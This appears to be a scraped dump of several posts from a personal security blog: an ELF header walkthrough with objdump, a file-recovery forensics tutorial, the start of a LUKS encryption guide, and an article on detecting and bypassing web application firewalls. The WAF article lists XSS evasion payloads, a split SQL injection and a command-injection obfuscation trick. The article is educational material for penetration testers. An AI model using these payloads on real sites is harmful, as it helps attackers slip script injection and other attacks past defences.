DATA 3 .gnu.hash 00000024 0000000000400298 0000000000400298 00000298 2**3 CONTENTS, ALLOC, LOAD, READONLY, DATA 4 .dynsym 00000150 00000000004002c0 00000000004002c0 000002c0 2**3 CONTENTS, ALLOC, LOAD, READONLY, DATA 5 .dynstr 000000a8 0000000000400410 0000000000400410 00000410 2**0 CONTENTS, ALLOC, LOAD, READONLY, DATA 6 .gnu.version 0000001c 00000000004004b8 00000000004004b8 000004b8 2**1 CONTENTS, ALLOC, LOAD, READONLY, DATA 7 .gnu.version\\_r 00000040 00000000004004d8 00000000004004d8 000004d8 2**3 CONTENTS, ALLOC, LOAD, READONLY, DATA 8 .rela.dyn 00000048 0000000000400518 0000000000400518 00000518 2**3 CONTENTS, ALLOC, LOAD, READONLY, DATA 9 .rela.plt 000000f0 0000000000400560 0000000000400560 00000560 2**3 CONTENTS, ALLOC, LOAD, READONLY, DATA 10 .init 00000017 0000000000400650 0000000000400650 00000650 2**2 CONTENTS, ALLOC, LOAD, READONLY, CODE 11 .plt 000000b0 0000000000400670 0000000000400670 00000670 2**4 CONTENTS, ALLOC, LOAD, READONLY, CODE 12 .text 000003d2 0000000000400720 0000000000400720 00000720 2**4 CONTENTS, ALLOC, LOAD, READONLY, CODE 13 .fini 00000009 0000000000400af4 0000000000400af4 00000af4 2**2 CONTENTS, ALLOC, LOAD, READONLY, CODE 14 .rodata 00000057 0000000000400b00 0000000000400b00 00000b00 2**3 CONTENTS, ALLOC, LOAD, READONLY, DATA 15 .eh\\_frame\\_hdr 0000003c 0000000000400b58 0000000000400b58 00000b58 2**2 CONTENTS, ALLOC, LOAD, READONLY, DATA 16 .eh\\_frame 00000100 0000000000400b98 0000000000400b98 00000b98 2**3 CONTENTS, ALLOC, LOAD, READONLY, DATA 17 .init\\_array 00000008 0000000000600e00 0000000000600e00 00000e00 2**3 CONTENTS, ALLOC, LOAD, DATA 18 .fini\\_array 00000008 0000000000600e08 0000000000600e08 00000e08 2**3 CONTENTS, ALLOC, LOAD, DATA 19 .dynamic 000001e0 0000000000600e10 0000000000600e10 00000e10 2**3 CONTENTS, ALLOC, LOAD, DATA 20 .got 00000010 0000000000600ff0 0000000000600ff0 00000ff0 2**3 CONTENTS, ALLOC, LOAD, DATA 21 .got.plt 00000068 0000000000601000 0000000000601000 00001000 2**3 CONTENTS, ALLOC, LOAD, DATA 22 .data 00000010 0000000000601068 0000000000601068 00001068 2**3 CONTENTS, ALLOC, LOAD, DATA 23 .bss 00000010 0000000000601078 0000000000601078 00001078 2**3 ALLOC 24 .comment 00000029 0000000000000000 0000000000000000 00001078 2**0 CONTENTS, READONLY Let’s break down the meaning of the new columns:\nSize: The size of the section in bytes VMA: The virtual memory address that the section will be loaded into during program execution LMA: The load memory address or the memory address that which the section will be loaded in physical memory Each of the sections listed in the output serves a particular purpose in the program. For instance, the .bss section contains uninitiated global variables and .gnu_hash is the hash table used for efficient symbol lookup in the dynamic linking process. The full meanings of the different sections can be found at this link towards the bottom of the page.\nA note on terminology: the ELF file used by the linker are called “sections” and the parts used by the loader are called “segments”.\nSymbol Table Finally, the symbol contains information useful for locating and relocating a program’s symbolic definitions and references. It helps in symbol resolution, linking, and debugging.\nSymbols are segments of code or information such as functions and variables that can be reused by the program. A symbol table keeps track of the different symbols and their locations.\nSYMBOL TABLE: 0000000000400238 l d .interp 0000000000000000 .interp 0000000000400254 l d .note.ABI-tag 0000000000000000 .note.ABI-tag 0000000000400274 l d .note.gnu.build-id 0000000000000000 .note.gnu.build-id 0000000000400298 l d .gnu.hash 0000000000000000 .gnu.hash 00000000004002c0 l d .dynsym 0000000000000000 .dynsym 0000000000400410 l d .dynstr 0000000000000000 .dynstr 00000000004004b8 l d .gnu.version 0000000000000000 .gnu.version 00000000004004d8 l d .gnu.version\\_r 0000000000000000 .gnu.version\\_r 0000000000400518 l d .rela.dyn 0000000000000000 .rela.dyn 0000000000400560 l d .rela.plt 0000000000000000 .rela.plt 0000000000400650 l d .init 0000000000000000 .init 0000000000400670 l d .plt 0000000000000000 .plt 0000000000400720 l d .text 0000000000000000 .text 0000000000400af4 l d .fini 0000000000000000 .fini 0000000000400b00 l d .rodata 0000000000000000 .rodata 0000000000400b58 l d .eh\\_frame\\_hdr 0000000000000000 .eh\\_frame\\_hdr 0000000000400b98 l d .eh\\_frame 0000000000000000 .eh\\_frame 0000000000600e00 l d .init\\_array 0000000000000000 .init\\_array 0000000000600e08 l d .fini\\_array 0000000000000000 .fini\\_array 0000000000600e10 l d .dynamic 0000000000000000 .dynamic 0000000000600ff0 l d .got 0000000000000000 .got 0000000000601000 l d .got.plt 0000000000000000 .got.plt 0000000000601068 l d .data 0000000000000000 .data 0000000000601078 l d .bss 0000000000000000 .bss 0000000000000000 l d .comment 0000000000000000 .comment 0000000000000000 l df *ABS* 0000000000000000 crtstuff.c 0000000000400760 l F .text 0000000000000000 deregister\\_tm\\_clones 0000000000400790 l F .text 0000000000000000 register\\_tm\\_clones 00000000004007d0 l F .text 0000000000000000 \\_\\_do\\_global\\_dtors\\_aux 0000000000601080 l O .bss 0000000000000001 completed.7698 0000000000600e08 l O .fini\\_array 0000000000000000 \\_\\_do\\_global\\_dtors\\_aux\\_fini\\_array\\_entry 0000000000400800 l F .text 0000000000000000 frame\\_dummy 0000000000600e00 l O .init\\_array 0000000000000000 \\_\\_frame\\_dummy\\_init\\_array\\_entry 0000000000000000 l df *ABS* 0000000000000000 heapedit.c 0000000000000000 l df *ABS* 0000000000000000 crtstuff.c 0000000000400c94 l O .eh\\_frame 0000000000000000 \\_\\_FRAME\\_END\\_\\_ 0000000000000000 l df *ABS* 0000000000000000 0000000000600e08 l .init\\_array 0000000000000000 \\_\\_init\\_array\\_end 0000000000600e10 l O .dynamic 0000000000000000 \\_DYNAMIC 0000000000600e00 l .init\\_array 0000000000000000 \\_\\_init\\_array\\_start 0000000000400b58 l .eh\\_frame\\_hdr 0000000000000000 \\_\\_GNU\\_EH\\_FRAME\\_HDR 0000000000601000 l O .got.plt 0000000000000000 \\_GLOBAL\\_OFFSET\\_TABLE\\_ 0000000000400af0 g F .text 0000000000000002 \\_\\_libc\\_csu\\_fini 0000000000000000 F *UND* 0000000000000000 free@@GLIBC\\_2.2.5 0000000000601078 g O .bss 0000000000000008 stdout@@GLIBC\\_2.2.5 0000000000601068 w .data 0000000000000000 data\\_start 0000000000000000 F *UND* 0000000000000000 puts@@GLIBC\\_2.2.5 0000000000601078 g .data 0000000000000000 \\_edata 0000000000400af4 g F .fini 0000000000000000 \\_fini 0000000000000000 F *UND* 0000000000000000 \\_\\_stack\\_chk\\_fail@@GLIBC\\_2.4 0000000000000000 F *UND* 0000000000000000 setbuf@@GLIBC\\_2.2.5 0000000000000000 F *UND* 0000000000000000 printf@@GLIBC\\_2.2.5 0000000000000000 F *UND* 0000000000000000 \\_\\_libc\\_start\\_main@@GLIBC\\_2.2.5 0000000000000000 F *UND* 0000000000000000 fgets@@GLIBC\\_2.2.5 0000000000601068 g .data 0000000000000000 \\_\\_data\\_start 0000000000000000 w *UND* 0000000000000000 \\_\\_gmon\\_start\\_\\_ 0000000000601070 g O .data 0000000000000000 .hidden \\_\\_dso\\_handle 0000000000400b00 g O .rodata 0000000000000004 \\_IO\\_stdin\\_used 0000000000400a80 g F .text 0000000000000065 \\_\\_libc\\_csu\\_init 0000000000000000 F *UND* 0000000000000000 malloc@@GLIBC\\_2.2.5 0000000000601088 g .bss 0000000000000000 \\_end 0000000000400750 g F .text 0000000000000002 .hidden \\_dl\\_relocate\\_static\\_pie 0000000000400720 g F .text 000000000000002b \\_start 0000000000601078 g .bss 0000000000000000 \\_\\_bss\\_start 0000000000400807 g F .text 0000000000000277 main 0000000000000000 F *UND* 0000000000000000 fopen@@GLIBC\\_2.2.5 0000000000000000 F *UND* 0000000000000000 \\_\\_isoc99\\_scanf@@GLIBC\\_2.7 0000000000000000 F *UND* 0000000000000000 strcat@@GLIBC\\_2.2.5 0000000000601078 g O .data 0000000000000000 .hidden \\_\\_TMC\\_END\\_\\_ 0000000000400650 g F .init 0000000000000000 \\_init The leftmost column is the memory address of the symbol. The next section represents 7 types of flags that the program can have. For instance, the first row containing the symbol .interpret has the flags “l” and “d”. The meaning of these can be found in the objdump man page in the --syms section. For instance, the flags on .interpret indicate that the symbol is local (only visible within the object file) and is a debugging symbol.\nThe structure of each entry in the symbol table is defined in the header file sys/elf.h or here:\ntypedef struct { Elf32\\_Word st\\_name; Elf32\\_Addr st\\_value; Elf32\\_Word st\\_size; unsigned char st\\_info; unsigned char st\\_other; Elf32\\_Half st\\_shndx; } Elf32\\_Sym; typedef struct { Elf64\\_Word st\\_name; unsigned char st\\_info; unsigned char st\\_other; Elf64\\_Half st\\_shndx; Elf64\\_Addr st\\_value; Elf64\\_Xword st\\_size; } Elf64\\_Sym; Conclusion The format of an ELF object file allows for reliable access to important details that aid in program execution such as dynamic linking and storing variables. Tools like objdump aid in revealing and understanding these pieces of information and the connections between them.\nMore Reading Oracle Documentation on ELF object file format Objdump Documentation Elf Man Page ","permalink":"https://ally-petitt.com/en/posts/2023-07-13_reverse-engineering---analyzing-headers-23dc84075cd/","summary":"objdump is a command line tool that can be used to gain insight into an executable binary. In this article, the tool will be used to dump all of the headers of the ELF binary heapedit with the command below. Then, we will analyze and explain each section of output from the top to the bottom.\nobjdump -x ./heapedit Executable and Linkable Format (ELF) files are a common file format for object files, executable binaries, core dumps, and shared libraries.","title":"Reverse Engineering — Analyzing Headers"},{"content":"Introduction This article will explain the tools and techniques used by web application penetration testers and security researchers to successfully bypass web application firewall (WAF) protections.\nWAFs are a cybersecurity solution to filter and block malicious web traffic. Common vendors include CloudFlare, AWS, Citrix, Akamai, Radware, Microsoft Azure, and Barracuda.\nDepending on the combination of mechanisms used by the firewall, the bypassing methods may differ. For instance, WAFs may use regex to detect malicious traffic. Regular expressions are used to detect patterns in a string of characters. You can read more about them here. WAFs may also employ signature-based detection, where known malicious strings are given a signature that is stored in a database and the firewall will check the signature of the web traffic against the contents of the database. If there is a match, the traffic is blocked. Additionally, some firewalls use heuristic-based detection.\nIdentifying WAFs Manually As stated previously, WAFs will often block overtly malicious traffic. In order to trigger a firewall and verify its existence, an HTTP request can be made to the web application with a malicious query in the URL such as https://example.com/?p4yl04d3=\u0026lt;script\u0026gt;alert(document.cookie)\u0026lt;/script\u0026gt;. The HTTP response may be different than expected for the webpage that is being visited. The WAF may return its own webpage such as the one shown below or a different status code, typically in the 400s.\nThrough a web proxy, cURL, or the “Network” tab of your browser’s DevTools additional indications of a firewall can be detected:\nThe name of the WAF in the Server header (e.g. Server: cloudflare) Additional HTTP response headers associated with the WAF (e.g. CF-RAY: xxxxxxxxxxx) Cookies that appear to be set by a WAF (e.g. the response headerSet-Cookie: __cfduid=xxxxx) Unique response code upon submitting malicious requests. (e.g. 412) Aside from crafting malicious queries and evaluating the response, firewalls can also be detected by sending a FIN/RST TCP packet to the server or implemening a side-channel attack. For instance, the timing of the firewall against different payloads can give hints as to the WAF being used.\nAutomations There are 3 automated methods of detecting and identifying WAFs that will be discussed in this article.\nRunning an Nmap Scan The Nmap Scripting Engine (NSE) includes scripts for detecting and fingerprinting firewalls. These scripts can be seen in use below.\n$ nmap --script=http-waf-fingerprint,http-waf-detect -p443 example.com Starting Nmap 7.93 ( https://nmap.org ) at 2023-05-29 21:43 PDT Nmap scan report for example.com (xxx.xxx.xxx.xxx) Host is up (0.20s latency). PORT STATE SERVICE 443/tcp open https | http-waf-detect: IDS/IPS/WAF detected: |\\_example.com:443/?p4yl04d3=\u0026lt;script\u0026gt;alert(document.cookie)\u0026lt;/script\u0026gt; Nmap done: 1 IP address (1 host up) scanned in 8.81 seconds WafW00f Wafw00f is a command line utility that sends commonly-flagged payloads to the given domain name and assess the web server’s response to detect and identify the firewall when possible.\n$ wafw00f example.com 3. WhatWaf\nIn addition to detecting a firewall, WhatWaf can attempt to discover a bypass by utilizing tamper scripts and assessing the web server’s response to the various payloads.\nThe results from WhatWaf are consistent with those of Wafw00f.\nBypassing WAFs This section will outline some of the potential WAF bypass techniques with examples.\nBypassing Regex This method applies to the regex filtering done by both the WAF and web server. During a black box penetration test, finding the regular expression used by the WAF may not be an option. If the regex is accessible, this article explains regex bypass through case studies.\nCommmon bypasses include changing the case of the payload, using various encodings, substituting functions or characters, using an alternative syntax, and using linebreaks or tabs. The examples below demonstrate some approaches to bypassing regex with comments.\n\u0026lt;sCrIpT\u0026gt;alert(XSS)\u0026lt;/sCriPt\u0026gt; #changing the case of the tag \u0026lt;\u0026lt;script\u0026gt;alert(XSS)\u0026lt;/script\u0026gt; #prepending an additional \u0026#34;\u0026lt;\u0026#34; \u0026lt;script\u0026gt;alert(XSS) // #removing the closing tag \u0026lt;script\u0026gt;alert`XSS`\u0026lt;/script\u0026gt; #using backticks instead of parenetheses java%0ascript:alert(1) #using encoded newline characters \u0026lt;iframe src=http://malicous.com \u0026lt; #double open angle brackets \u0026lt;STYLE\u0026gt;.classname{background-image:url(\u0026#34;javascript:alert(XSS)\u0026#34;);}\u0026lt;/STYLE\u0026gt; #uncommon tags \u0026lt;img/src=1/onerror=alert(0)\u0026gt; #bypass space filter by using / where a space is expected \u0026lt;a aa aaa aaaa aaaaa aaaaaa aaaaaaa aaaaaaaa aaaaaaaaaa href=javascript:alert(1)\u0026gt;xss\u0026lt;/a\u0026gt; #extra characters Obfuscation While obfuscation is a possible way to bypass regex, they have been divided into different sections to showcase more exclusively a selection of obfuscation techniques.\nFunction(\u0026#34;ale\u0026#34;+\u0026#34;rt(1)\u0026#34;)(); #using uncommon functions besides alert, console.log, and prompt javascript:74163166147401571561541571411447514115414516216450615176 #octal encoding \u0026lt;iframe src=\u0026#34;javascript:alert(`xss`)\u0026#34;\u0026gt; #unicode encoding /?id=1+un/**/ion+sel/**/ect+1,2,3-- #using comments in SQL query to break up statement new Function`alt\\`6\\``; #using backticks instead of parentheses data:text/html;base64,PHN2Zy9vbmxvYWQ9YWxlcnQoMik+ #base64 encoding the javascript %26%2397;lert(1) #using HTML encoding \u0026lt;a src=\u0026#34;%0Aj%0Aa%0Av%0Aa%0As%0Ac%0Ar%0Ai%0Ap%0At%0A%3Aconfirm(XSS)\u0026#34;\u0026gt; #Using Line Feed (LF) line breaks \u0026lt;BODY onload!#$%\u0026amp;()*~+-\\_.,:;?@[/|\\]^`=confirm()\u0026gt; # use any chars that aren\u0026#39;t letters, numbers, or encapsulation chars between event handler and equal sign (only works on Gecko engine) Additional resources include PayloadsAllTheThings and OWASP.\n2. Charset This technique involves modifying the Content-Type header to use a different charset (e.g. ibm500). A WAF that is not configured to detect malicious payloads in different encodings may not recognize the request as malicious. The charset encoding can be done in Python\n$ python3 -- snip -- \u0026gt;\u0026gt;\u0026gt; import urllib.parse \u0026gt;\u0026gt;\u0026gt; s = \u0026#39;\u0026lt;script\u0026gt;alert(\u0026#34;xss\u0026#34;)\u0026lt;/script\u0026gt;\u0026#39; \u0026gt;\u0026gt;\u0026gt; urllib.parse.quote\\_plus(s.encode(\u0026#34;IBM037\u0026#34;)) \u0026#39;L%A2%83%99%89%97%A3n%81%93%85%99%A3M%7F%A7%A2%A2%7F%5DLa%A2%83%99%89%97%A3n\u0026#39; The encoded string can then be sent in the request body and uploaded to the server.\nPOST /comment/post HTTP/1.1 Host: chatapp Content-Type: application/x-www-form-urlencoded; charset=ibm500 Content-Length: 74 %A2%83%99%89%97%A3n%81%93%85%99%A3M%7F%A7%A2%A2%7F%5DLa%A2%83%99%89%97%A3 Content Size In some cloud-based WAFs, the request won’t be checked if the payload exceeds a certain size. In these scenarios, it is possible to bypass the firewall by increasing the size of the request body or URL.\nUnicode Compatibility http://www.unicode.org/reports/tr15/print-images/UAX15-NormFig6.jpg\nUnicode Compatibility is a concept that describes the decomposition of visually distinct characters into the same basic abstract character. It is a form of unicode equivalence.\nFor instance, the characters／(U+FF0F) and / (U+002F) are different, but in some contexts they will have the same meaning as each other. The shared meaning allows for the characters are compatible with each other, meaning that they can both be translated to the standard forward-slash character/(U+002F) despite starting out as different characters. Digging deeper, whether ／(U+FF0F) and / (U+002F) will end up as the same forward-slash character depends on the way that they are normalized, or translated, by the web server.\nCharacters are typically normalized through one of the four standard Unicode normalization algorithms:\nNFC: Normalization Form Canonical Composition NFD: Normalization Form Canonical Decomposition NFKC: Normalization Form Compatibility Composition NFKD: Normalization Form Compatibility Decomposition NFKC and NFKD in particular will decompose the characters by compatibility, which is unlike NFC and NFD (more details here). The implication is that on web servers where the user input is first sanitized, then normalized with either NFKC or NFKD, the unexpected, compatible characters can bypass the WAF and execute as their canonical equivalents on the backend. This is a result of the WAF not expecting unicode-compatible characters. Jorge Lahara demonstrates this in the PoC webserver below.\nfrom flask import Flask, abort, request import unicodedata from waf import waf app = Flask(\\_\\_name\\_\\_) @app.route(\u0026#39;/\u0026#39;) def Welcome\\_name(): name = request.args.get(\u0026#39;name\u0026#39;) if waf(name): abort(403, description=\u0026#34;XSS Detected\u0026#34;) else: name = unicodedata.normalize(\u0026#39;NFKD\u0026#39;, name) #NFC, NFKC, NFD, and NFKD return \u0026#39;Test XSS: \u0026#39; + name if \\_\\_name\\_\\_ == \u0026#39;\\_\\_main\\_\\_\u0026#39;: app.run(port=81) Where the inial payload of ＜img src=p onerror='prompt(1)'\u0026gt; may have been detected by the firewall, the payload constructed with Unicode-compatible characters (＜img src⁼p onerror⁼＇prompt⁽1⁾＇﹥) would remain undetected.\nWeb servers that normalize input after it has been sanitized may be vulnerable to WAF bypass through Unicode compatibility. Compatible characters can be found here.\nUninitialized Variables Another potential method is to use uninitialized variables in your request (e.g. $u) as demonstrated in this article. This is possible in command execution scenarios because Bash treats uninitialized variables as empty strings. When concatenating empty strings with a command payload, the result ends up being the command payload.\nhttps://www.secjuice.com/content/images/2018/08/image-3.png\nWhen on a system that is vulnerable to command injection, inserting uninitialized variables in the payload can act as a form of obfuscation, bypassing the firewalls.\nhttps://www.secjuice.com/content/images/2018/08/waf3_2.png\nMore Reading https://hacken.io/discover/how-to-bypass-waf-hackenproof-cheat-sheet/ https://jlajara.gitlab.io/Bypass_WAF_Unicode https://blog.yeswehack.com/yeswerhackers/web-application-firewall-bypass/ https://www.sisainfosec.com/blogs/identifying-web-application-firewall-in-a-network/ https://owasp.org/www-pdf-archive/OWASP_Stammtisch_Frankfurt_WAF_Profiling_and_Evasion.pdf ","permalink":"https://ally-petitt.com/en/posts/2023-06-01_5-ways-i-bypassed-your-web-application-firewall--waf--43852a43a1c2/","summary":"Introduction This article will explain the tools and techniques used by web application penetration testers and security researchers to successfully bypass web application firewall (WAF) protections.\nWAFs are a cybersecurity solution to filter and block malicious web traffic. Common vendors include CloudFlare, AWS, Citrix, Akamai, Radware, Microsoft Azure, and Barracuda.\nDepending on the combination of mechanisms used by the firewall, the bypassing methods may differ. For instance, WAFs may use regex to detect malicious traffic.","title":"5 Ways I Bypassed Your Web Application Firewall (WAF)"},{"content":"Computer Forensics for File Recovery https://edgy.app/wp-content/uploads/2018/04/dataleakhackerGorodenkoff-970x546.jpg\nIntroduction When a file is “deleted”, its contents aren’t typically erased from the storage device that it was stored on. More often than not, the blocks that stored the file are marked as unallocated and the filesystem pointers are removed from it. The implication is that the file still exists on the disk until it is overwritten.\nThere are many methods to recovering the raw, unallocated data. This website lists many tools that can be used for file recovery in different scenarios. In this article, I’ll be walking through 5 different tools that can be used to recover data.\nSetup I’ll be using doing forensic analysis on a drive that I created and attached to my Kali Linux VM. To see how this is done, you can reference this article. On this drive, I saved and then deleted an image file and text file.\nI’ll start by doing general enumeration on the disk image. Then, I’ll showcase a variety of file recovery techniques used by forensic analysts that allowed me to recover the deleted files. Many of the tools used will be from the Sleuth Kit (TSK).\nBefore starting, I’ll unmount the filesystem, create a duplicate of it, remove write permissions from the duplicate, and verify the integrity of the duplicate against the original hash of /dev/sdb.\n$ cd ../ \u0026amp;\u0026amp; umount /mnt/secret # unmount /mnt/secret $ dd if=/dev/sdb of=/home/kali/forensics/sdb.img # copy /dev/sdb into sdb.img 22286+0 records in 22286+0 records out 11410432 bytes (11 MB, 11 MiB) copied, 0.0412053 s, 277 MB/s $ chmod a-w /home/kali/forensics/sdb.img # remove write access to the image $ md5sum /home/kali/forensics/sdb.img /dev/sdb 6c49fb21916d59e0df69453959392e23 /home/kali/forensics/sdb.img 6c49fb21916d59e0df69453959392e23 /dev/sdb Enumeration Image Analysis Using the file command reveals that the image uses an ext4 file system.\nFurthermore, the stat command displays information about the image such as its size, time stamps, and block details.\nWith the information that the image uses ext4, the fsstat command can be used to extract more detailed information about the file system, metadata, content data, and block groups.\n$ fsstat -f ext4 sdb.img FILE SYSTEM INFORMATION -------------------------------------------- File System Type: Ext4 Volume Name: Volume ID: dc8a4fb36dce8eabee4c51cf01c2d52a Last Written at: 2023-05-09 22:35:31 (EDT) Last Checked at: 2023-05-09 22:23:26 (EDT) Last Mounted at: 2023-05-09 22:24:27 (EDT) Unmounted properly Last mounted on: /mnt/secret Source OS: Linux Dynamic Structure Compat Features: Journal, Ext Attributes, Resize Inode, Dir Index InCompat Features: Filetype, Extents, 64bit, Flexible Block Groups, Read Only Compat Features: Sparse Super, Large File, Huge File, Extra Inode Size Journal ID: 00 Journal Inode: 8 METADATA INFORMATION -------------------------------------------- Inode Range: 1 - 2785 Root Directory: 2 Free Inodes: 2773 Inode Size: 256 CONTENT INFORMATION -------------------------------------------- Block Groups Per Flex Group: 16 Block Range: 0 - 11139 Block Size: 1024 Reserved Blocks Before Block Groups: 1 Free Blocks: 9223 BLOCK GROUP INFORMATION -------------------------------------------- Number of Block Groups: 2 Inodes per group: 1392 Blocks per group: 8192 Group: 0: Block Group Flags: [INODE\\_ZEROED] Inode Range: 1 - 1392 Block Range: 1 - 8192 Layout: Super Block: 1 - 1 Group Descriptor Table: 2 - 2 Group Descriptor Growth Blocks: 3 - 89 Data bitmap: 90 - 90 Inode bitmap: 92 - 92 Inode Table: 94 - 441 Uninit Data Bitmaps: 92 - 105 Uninit Inode Bitmaps: 94 - 107 Uninit Inode Table: 790 - 5661 Data Blocks: 5690 - 8192 Free Inodes: 1381 (99%) Free Blocks: 6365 (77%) Total Directories: 2 Stored Checksum: 0x7DEB Group: 1: Block Group Flags: [INODE\\_UNINIT, INODE\\_ZEROED] Inode Range: 1393 - 2784 Block Range: 8193 - 11139 Layout: Super Block: 8193 - 8193 Group Descriptor Table: 8194 - 8194 Group Descriptor Growth Blocks: 8195 - 8281 Data bitmap: 91 - 91 Inode bitmap: 93 - 93 Inode Table: 442 - 789 Data Blocks: 8282 - 11139 Free Inodes: 1392 (100%) Free Blocks: 2858 (96%) Total Directories: 0 Stored Checksum: 0xDFA7 Based on this output, it is clear that the block size is 1024 bits, there are 1113 total blocks, and there are 2785 inodes.\nIn addition, parted can be used to find more information on the partition table, which can be useful when using scalpel.\nFinally, running strings on the image gives more insight as to what is in the filesystem. It appears that my secret.txt file with the contents Hello World is appearing from the strings command in addition to a failed image download attempt.\nIn the command strings -a --radix=d sdb.img, -a is an option to scan the entire file and --radix=d tells strings to show the offset that the string was found at in base 10.\nAnalyzing the Files This particular image does not have any files currently in it aside from deleted files, so there isn’t much information to gain from mounting it and analyzing the files. In cases where it is desireable to do so, the following command can be used:\n$ mount -o ro,loop,noexec,noatime sdb.img Below, I’ll explain what the options do:\n-o: sets the options for mounting sdb.img. ro: an option to mount the file system as being read-only loop: mount the file system on a loop device noexec: disallow execution noatime: don’t change the access time of the files You can then continue to run file on the files within the mounted loop device and save their md5 hashes to verify integrity.\nRecovering the Files Method 1: Using Sleuth Kit Often, if you have deleted files, they may be displayed with fls sdb.img, enumerated with istat -o \u0026lt;offset\u0026gt; sdb.img \u0026lt;inode_number\u0026gt;, and recovered with icat -o \u0026lt;offset\u0026gt; sdb.img \u0026lt;inode_number\u0026gt;. An example of the latter 2 steps are shown in the screenshot below.\nhttps://www.therootuser.com/wp-content/uploads/2017/11/Screenshot-2017-11-07-17.27.58.png\nThis does not appear to be the case for me, however. My deleted files are not appearing from the fls command. Instead, I see a variable called $OrphanFiles.\n$OrphanFiles are files that still exist in the image, but are no longer able to be accessed from the root directory. $OrphanFiles is not an actual directory on the image, it is Sleuth Kit’s virtual way to demonstrate that the file metadata still exists (read more).\nTo recover these orphan files, I will attempt a few techniques starting with extundelete.\nMethod 2: Extundelete This tool can be used to recover files on ext3 and ext4 filesystems. I was having some difficulties with the build from apt, so I build the program from source with the following commands to it working again:\napt update \u0026amp;\u0026amp; apt install -y libext2fs-dev git clone https://github.com/cherojeong/extundelete.git ./configure make src/extundelete --restore-all /path/to/image.img os \u0026lt;\u0026lt; “Directory ACL: “ \u0026lt;\u0026lt; inode.i_dir_acl \u0026lt;\u0026lt; std::endl; with os \u0026lt;\u0026lt; “Directory ACL: “ \u0026lt;\u0026lt; inode.i_file_acl \u0026lt;\u0026lt; std::endl;.\nThe command extundelete --restore-all sdb.img can be used to recover files.\nAs you can see in the screenshot above, the tool was unsuccessful in recovering the orphan files. This is still a viable option that can work in many scenarios which is why I decided to include it in this article.\nI’m not giving up yet. We’ll try again!\nMethod 3: TestDisk The .tar.bz file can be downloaded here. I’m using version 7.2. Note that in order for TestDisk to work, you must run it in the download directory. Otherwise you might get an error like *** Error in /path/to/testdisk-7.2-WIP/photorec_static\u0026rsquo;: malloc(): memory corruption: 0x0000000002617d29 ***`.\n# extract and run the file tar -xf testdisk-7.2-WIP.linux26-x86\\_64.tar.bz2 cd testdisk-7.2-WIP ./photorec\\_static /path/to/sdb.img /log A help menu will appear. I’ll first select the image that I want to work with.\nThen, I select the option for the partition table for the media. Mine does not have one, so I choose “None”. I verified that this was the only option that was able to list files for me.\nAfter this, I navigate to the “List” option at the bottom of the terminal and press Enter.\nThis leads me to the listing of the files on the image with the successfully recovered ones in red text.\nAs you can see in the screenshot, there are no new files there listed in red. This means that TestDisk was unsuccessful in recovering the deleted files.\nIt’s okay, I still got a few more tricks up my sleeve.\nMethod 4: Foremost Foremost can be installed with apt.\nsudo apt install foremost This tool uses a technique known as file carving which involves searching through the raw data on a disk and carving out the values between the header and/or footer of the file.\nAlas, we were able to recover a deleted image file from the drive with foremost -t jpeg -o recovered-files -i sdb.img. The recovered image renders as expected in the Image Viewer. What a pretty camp fire.\nThe fact that this worked while the previous 3 methods did not further demonstrates that different tools and techniques will be more effective at data recovery in different scenarios.\nIt’s also worth mentioning that you can edit the /etc/foremost.conf file to contain your own custom headers and footers for the file you are looking for. Modifying these values will be explored in the next and final method.\nMethod 5: Scalpel Scalpel is much like Foremost with added flexibility. You are not as limited on the file types and headers, although there is a way to modify foremost to have the same customization that scalpel provides.\nsudo apt install scalpel cp /etc/scalpel/scalpel.conf . vim scalpel.conf I’ll edit the config with the bit of background information that I have. I know that I’m attempting to recover a JPEG file and I also know that there was a text file that began with the word “Hello”. By using xxd, I can determine the file headers for a .txt file starting with the word “Hello”. In this case, it would be \\x48\\x65\\x6c\\x6c\\x6f.\n$ echo -n Hello | xxd 00000000: 4865 6c6c 6f Hello. We will use this information to update the scalpel.conf file in vim. As explained in the comments at the top of the config file, the first column indicates the file extension. The second is whether the header and footer are case sensitive, the third is the header in hexadecimal bytes, the fourth column is an optional footer, and the fifth column is an optional parameter to search backwards from the header rather than just forward.\nWith these options set, scalpel can now be ran to extract these files from the drive.\nscalpel -o recovered-files\\_scalpel -c scalpel.conf sdb.img It appears that the text file was successfully recovered.\nThe image was recovered as well.\nConclusion There’s many ways to achieve the same outcome. The different tools showcased here have their specific applications where they perform best. Even though not all the methods outlined here worked for my particular situation, that doesn’t mean they won’t work for you. There are many factors that determine whether file recovery will be successful including the partitioning table type, how long it has been since they were deleted, the size of the file (smaller files are more likely to be recovered), the health of the storage device, and the operations that have been done on the drive since deleting the files such as reformatting the drive.\nI hope that through reading this article, you were able to deepen your understanding of file recovery and gain practical knowledge that you can apply in the real world. Thanks for reading and I’ll see you next time.\n","permalink":"https://ally-petitt.com/en/posts/2023-05-13_5-ways-i-found-your-deleted-files-492407dbd467/","summary":"Computer Forensics for File Recovery https://edgy.app/wp-content/uploads/2018/04/dataleakhackerGorodenkoff-970x546.jpg\nIntroduction When a file is “deleted”, its contents aren’t typically erased from the storage device that it was stored on. More often than not, the blocks that stored the file are marked as unallocated and the filesystem pointers are removed from it. The implication is that the file still exists on the disk until it is overwritten.\nThere are many methods to recovering the raw, unallocated data.","title":"5 Ways I Found Your Deleted Files"},{"content":"Introduction Hey everyone, this is a pretty quick article on LUKS drive encryption on Linux with the cryptsetup library. By following the steps outlined here, you will be able to encrypt a drive, decrypt it, and mount it. This was done in a Kali Linux VM and commands may vary for other distributions.\nDisclaimer: This is not an area that I have much experience in so if details are inaccurate, I apologize in advance.\nCreating a new partition I’m using a virtual machine with 2 virtual hard disks.\nDemonstrating my disks with “lsblk -e7”\nI’ll be using a tool called parted to create a partition on /dev/sdb. Historically, when a system uses the Master Boot Record (MBR) partition table, fdisk is used to manage the partition. In this article, I’ll use parted because of its usability in scripting and automation.\nI’ll start by listing the information of the drives.\nparted -s /dev/sdb print all The output msdos under /dev/sda, indicates that sda is using the MBR partition table. Learn more about partition table types here and here.\nI’ll now create the GPT partition table on /dev/sdb. You’ll notice that after running the command, /dev/sdb now appears as a gpt partition table.\nI then create a partition on the disk with the ext4 file system.\nThe commands I used for this are below. The values for the start and ending offsets when creating the partitions can be expressed in both percentages and exact byte values. Reference the man page for more details.\nparted -s /dev/sdb mklabel gpt parted -s /dev/sdb mkpart primary ext4 0% 50MiB Encrypting the Drive This demonstrates how to encrypt file system using LUKS. It is important to remember the passphrase that you enter while encrypting the partition because it is a key piece of information when decrypting the drive.\ncryptsetup luksFormat /dev/sdb # encrypt /dev/sdb with luks Decrypting the Drive 